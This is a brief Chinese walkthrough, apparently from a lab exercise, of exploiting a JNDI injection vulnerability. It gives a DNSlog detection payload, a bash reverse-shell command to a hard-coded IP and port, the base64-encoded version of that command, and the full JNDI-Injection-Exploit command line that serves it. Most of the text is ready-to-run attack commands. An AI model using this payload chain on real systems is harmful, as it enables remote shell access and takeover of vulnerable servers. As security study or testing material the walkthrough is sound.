###### 1.DNSlog验证

首先再DNSlog获取域名，构造payload：payload=${jndi:ldap://tr2gk6.dnslog.cn}

![XqQMl9.png](https://s1.ax1x.com/2022/06/17/XqQMl9.png)



DNSlog网站接收到解析记录，说明存在漏洞

![XqQ3ex.png](https://s1.ax1x.com/2022/06/17/XqQ3ex.png)

###### **2.** JNDI注入反弹shell

首先下载好JNDI注入工具，上传到云服务器上

 

反弹shell指令:

bash -i >& /dev/tcp/124.222.155.178/8888 0>&1

 

进行base64编码

![XqQKSJ.png](https://s1.ax1x.com/2022/06/17/XqQKSJ.png)

 

JNDI启动:

第一处标红部分是经过base64编码过后的指令，第二处是监听服务器的IP地址。

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c "{echo,<font color='red'>CmJhc2ggLWkgPiYgL2Rldi90Y3AvMTI0LjIyMi4xNTUuMTc4Lzg4ODggMD4mMQ==</font>}|{base64,-d}|{bash,-i}" -A <font color='red'>124.222.155.178</font>

![XqQlO1.png](https://s1.ax1x.com/2022/06/17/XqQlO1.png)

测试了用前两个都不行，使用第三个监听到了

 

设置监听

![XqQQyR.png](https://s1.ax1x.com/2022/06/17/XqQQyR.png)

 



 

反弹成功

![XqQ8w6.png](https://s1.ax1x.com/2022/06/17/XqQ8w6.png)

 

 